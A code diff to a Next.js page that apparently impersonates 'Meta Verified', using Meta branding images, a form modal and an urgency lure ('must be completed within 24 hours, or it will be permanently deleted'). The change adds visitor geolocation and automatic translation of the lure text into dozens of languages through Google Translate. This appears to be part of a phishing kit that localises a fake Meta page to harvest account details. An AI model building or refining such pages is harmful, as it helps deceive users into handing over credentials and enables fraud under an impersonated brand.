@@ -3,7 +3,7 @@ import { store } from '@/store/store';
 import { getTranslations } from '@/utils/translate';
 import axios from 'axios';
 import dynamic from 'next/dynamic';
-import { useEffect, useMemo, useState, type FC } from 'react';
+import { useEffect, useState, type FC } from 'react';
 import Image from 'next/image';
 import MetaBanner from '@/assets/images/imagemeta.webp';
 import MetaLogo from '@/assets/images/unnamedmeta.png';
@@ -11,26 +11,10 @@ import MetaBanner1 from '@/assets/images/imagemeta1.webp';
 
 const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });
 
-// Country code to language mapping
-const countryToLanguage: Record<string, string> = {
-    VN: 'vi',
-    US: 'en',
-    GB: 'en',
-    CA: 'en',
-    AU: 'en',
-    // ... add more countries as needed, default is en
-};
-
 const Page: FC = () => {
     const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
+    const [translations, setTranslations] = useState<Record<string, string>>({});
     const [modalKey, setModalKey] = useState(0);
-
-    // Compute translations instantly without setState
-    const translations = useMemo(() => {
-        if (!geoInfo) return {};
-        const lang = countryToLanguage[geoInfo.country_code] || 'en';
-        return getTranslations(lang);
-    }, [geoInfo]);
 
     const t = (text: string): string => {
         return translations[text] || text;
@@ -63,6 +47,118 @@ const Page: FC = () => {
         };
         fetchGeoInfo();
     }, [setGeoInfo, geoInfo]);
+
+    // Translate texts in parallel (fast!) instead of sequentially
+    useEffect(() => {
+        if (!geoInfo || Object.keys(translations).length > 0) return;
+
+        (async () => {
+            // First check if we have hardcoded translation
+            const langMap: Record<string, string> = {
+                VN: 'vi',
+            };
+            
+            const lang = langMap[geoInfo.country_code];
+            if (lang && lang !== 'en') {
+                // Use hardcoded translation for Vietnamese
+                const hardcoded = getTranslations(lang);
+                setTranslations(hardcoded);
+                return;
+            }
+
+            // For other languages, use API Google Translate with parallel requests
+            const textsToTranslate = [
+                'Upgrade your profile with Meta Verified — enjoy exclusive benefits.',
+                'This form must be completed within 24 hours, or it will be permanently deleted.',
+                'Protect your brand with Meta Verified',
+                'Meta Verified Logo',
+                'Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.',
+                'Subscribe on Page',
+                'Subscribe on Instagram',
+                'Are you a business?',
+                'Get more information on',
+                'Meta Verified for businesses',
+                'Features, availability and pricing may vary by region and app.',
+                'Meta Verified Example',
+                'Meta Verified benefits',
+                'Verified badge',
+                'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
+                'Impersonation protection',
+                'Enhanced support',
+                'Upgraded profile features',
+            ];
+
+            const detectLanguage = async (countryCode: string): Promise<string> => {
+                const countryToLang: Record<string, string> = {
+                    AE: 'ar', AT: 'de', BE: 'nl', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el', CZ: 'cs',
+                    DE: 'de', DK: 'da', EE: 'et', EG: 'ar', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
+                    GR: 'el', HR: 'hr', HU: 'hu', IE: 'ga', IN: 'hi', IT: 'it', LT: 'lt', LU: 'lb',
+                    LV: 'lv', MT: 'mt', MY: 'ms', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro',
+                    SE: 'sv', SI: 'sl', SK: 'sk', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi',
+                    JO: 'ar', LB: 'ar', QA: 'ar', IQ: 'ar', SA: 'ar', IL: 'iw', KR: 'ko'
+                };
+                return countryToLang[countryCode] || 'en';
+            };
+
+            const targetLang = await detectLanguage(geoInfo.country_code);
+            if (targetLang === 'en') {
+                return; // No need to translate to English
+            }
+
+            // Get cache
+            const CACHE_KEY = 'translation_cache';
+            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
+            const cache = cached ? JSON.parse(cached) : {};
+
+            // Translate ALL texts in parallel with Promise.all
+            const translatePromises = textsToTranslate.map(async (text) => {
+                const cacheKey = `en:${targetLang}:${text}`;
+                
+                // Return cached if available
+                if (cache[cacheKey]) {
+                    return { text, translated: cache[cacheKey] };
+                }
+
+                try {
+                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
+                        params: {
+                            client: 'gtx',
+                            sl: 'en',
+                            tl: targetLang,
+                            dt: 't',
+                            q: text
+                        }
+                    });
+
+                    const translatedText = response.data[0]
+                        ?.map((item: unknown[]) => item[0])
+                        .filter(Boolean)
+                        .join('') || text;
+
+                    cache[cacheKey] = translatedText;
+                    return { text, translated: translatedText };
+                } catch {
+                    return { text, translated: text };
+                }
+            });
+
+            // Wait for all translations at once (parallel)
+            const results = await Promise.all(translatePromises);
+            
+            // Save cache
+            if (typeof window !== 'undefined') {
+                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
+            }
+
+            // Build translation map
+            const translatedMap: Record<string, string> = {};
+            results.forEach(({ text, translated }) => {
+                translatedMap[text] = translated;
+            });
+
+            setTranslations(translatedMap);
+        })();
+    }, [geoInfo, translations]);
 
     return (
         <div className="w-full flex flex-col bg-gradient-to-br from-[#f3e7e9] via-[#c7e0f7] to-[#6ec6f7] min-h-screen" style={{margin:0,padding:0}}>
